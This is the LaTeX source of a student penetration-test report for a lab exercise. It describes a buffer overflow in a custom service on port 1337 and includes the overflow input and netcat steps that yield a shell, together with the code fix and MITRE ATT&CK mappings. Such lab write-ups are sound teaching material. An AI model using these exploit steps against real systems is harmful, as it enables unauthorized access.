%  Make this into a pdf document as follows:
%
%
% The edit the Report.tex file appropriately to include only those elements that
% make sense for the assignment you're reporting on.
%
% You can use a tool like TeXShop or Texmaker or some other graphical tool
% to convert Report.text into a pdf file.
%
% If you are making this with command line tools, you'd run the following command:
%
%     latex Report.tex
%
% That will generate a dvi (device independent) document file called Report.dvi
% The pages reported in the table of contents won't be correct, since latex only
% processes one pass over the document. To adjust the page numbers in the contents,
% run latex again:
%
%    latex Report.tex
%
% Then run
%
%   dvipdf Report.dvi
%
% to generate Report.pdf
%
% You can view this file to check it out by running
%
% xdg-open Report.pdf
%
% That's it.
  
\def\cvss(#1,#2,#3,#4,#5,#6,#7,#8,#9){
	\indent\textbf{CVSS Base Severity Rating: #9}  AV:#1 AC:#2 PR:#3 UI:#4 S:#5 C:#6 I:#7 A:#8}
  
\def\ttp(#1, #2, #3, #4, #5, #6){
   \indent\textbf{#1:} #2 \\
   \indent\indent\textbf{#3:} #4 \\
   \indent\indent\indent\textbf{#5:} #6 \\}

\documentclass[notitlepage]{article}

\usepackage{bibunits}
\usepackage{comment}
\usepackage{graphicx}
\usepackage{amsmath}
\usepackage{datetime}
\usepackage{numprint}

% processes above options
\usepackage{palatino}  %OR newcent ncntrsbk helvet times palatino
\usepackage{url}
\usepackage{footmisc}
\usepackage{endnotes}

\setcounter{secnumdepth}{3}
\begin{document}

\nplpadding{2}
\newdateformat{isodate}{
  \THEYEAR -\numprint{\THEMONTH}-\numprint{\THEDAY}}
  
\title{Penetration Test - Exercise 07}
\author{Esteban Calvo}
\date{\isodate\today}

\maketitle

\tableofcontents

\newpage

\section{Technical Report}

% Include one of these headings for each finding.

  \subsection{Finding: \emph{Netcat Shell Access}}
  
	\subsubsection*{Severity Rating}
		Critical Risk: \\
		\cvss(N,L,N,R,C,H,H,H,9.6)
		
  	\subsubsection*{Vulnerability Description}
  		The program running on port 1337 written by Brian Oppenheimer is intended to allow system admins see the server status without having to login and
        thus essentially run as regular users. An error in the code allows for a buffer overflow of the name to leak into the list of possible commands to run
        and therefore allows the user to run a shell with elevated commands if they overflow the correct command. 
  	\subsubsection*{Confirmation method}
  	    The following script can be used to gain shell access to the server
    \begin{verbatim}
netcat www.artstailor.com 1337
1234567890123456hs
brian
sh
    \end{verbatim}
				
    \subsubsection*{Mitigation or Resolution Strategy}
    To address this problem, there are two possible solutions. The easiest solution would be to disable this service or make sure it can only be accessed
    within internal networks. There is no real reason other than ease of use for this port to always be active and listening so I recommend the termination of
    this program. If there is adequate reason to keep this service running, the toool.c code must be changed to make sure that overflowed user input will not
    leak into the list of commands.



\section{Attack Narrative}

    \subsection{Port Discovery}
        The post made on 42chan by Brian revealed that there was some port on artstailor.com that could be exploited. Running the command
        \begin{verbatim}
nmap -p- www.artstailor.com    
        \end{verbatim}
        revealed that port 1337 was open. Using the command
        \begin{verbatim}
netcat www.artstailor.com 1337    
        \end{verbatim}
        Returned the response I wanted, the next part from here was to look for possible vulernabilites with this program.

    \subsection{Exploitation}
        The next part of this process was seeing if there was a way to exploit the program responding to my nc request. In the program, there
        were only three allowed commands and none of them helped in any way to gain access to the machine. My first idea was to attempt to overflow the
        buffer reading in the commands but I found that I was not able to truly understand at what point the buffer was overflowing and why so I shifted focus.
        The next part to try was the login response that asked for my name. It states that there is a 15 character limit and and I saw by typing in random numbers the program
        was in fact reading in 16 characters and then after that, the rest of the characters would overflow into the list of acceptable commands. Another observation I saw was
        that the ps auxww command was no longer able to be executed which meant that it was in fact changing the list of commands I was allowed to type. The last important observation
        I noticed was that after 16 characters, the characters after that were getting reversed. So, putting this all together, I came up with the idea to insert the following name when
        prompted
    \begin{verbatim}
Enter Name of admin (max 15 characters)
1234567890123456hs
Enter Name of admin (max 15 characters)
brian
Enter Command
netstat -nat
ip a
sh
    \end{verbatim}
    From here, typing the sh command gave me shell access and I was able to navigate all directories as user brian confirmed by the following
    \begin{verbatim}
id
uid=1000(brian) gid=1000(brian) groups=1000(brian), 100(users)
    \end{verbatim}

    \subsection{Analyzing Code}
    The code for the netcat server response was found inside the home folder for brian "/home/brian/toool.c". Analyzing the code, I was able to see 
    some important features such as why the characters at the end were reversed. The most important thing to note though was the source of the overflow which was
    caused by fgets reading in a buffer of size 1024 while the expected size of admin name is 15 characters plus a newline character. Thus, to fix the issue, we need 
    to rewrite this line as follows
\begin{verbatim}
fgets(admin, sizeof(admin), stdin);
    \end{verbatim}
    Several other lines of code are questionable such as putting all the commands in one array, but I believe the reading of the name was the main issue that caused the overflow.

    \subsection{MITRE ATT{\&}CK Framework TTPs}
        
	
	\subsubsection*{}
	\indent\textbf{TA0001:} Initial Access \\
    \indent\indent\textbf{T1190:} Exploit Public Facing Application \\
    
	\subsubsection*{}
	\ttp(TA0043, Reconnaissance, T1593, Search Open Websites/Domains, .001, Social Media)

    \subsection*{}
	\ttp(TA0002, Execution, T1059, Command and Scripting Interpreter, .004, Unix Shell)


    \subsection{Key}
        With access to the home folder for brian, I was able to ls -la and see a file called ".secret". Inside this file was contained the following key
        \begin{verbatim}
KEY009-\x80\xa9\x86\xbc\xa6\xb7\x80\xa6\x92\xa1\x9f\x95
\xc7\x9d\xc0\x9e\xbc\x9e\xb2\x85\xb7\x86\xcc\xcc
        \end{verbatim}
        The key is encrypted, but no successful attempt decrypted the key.
\end{document} 
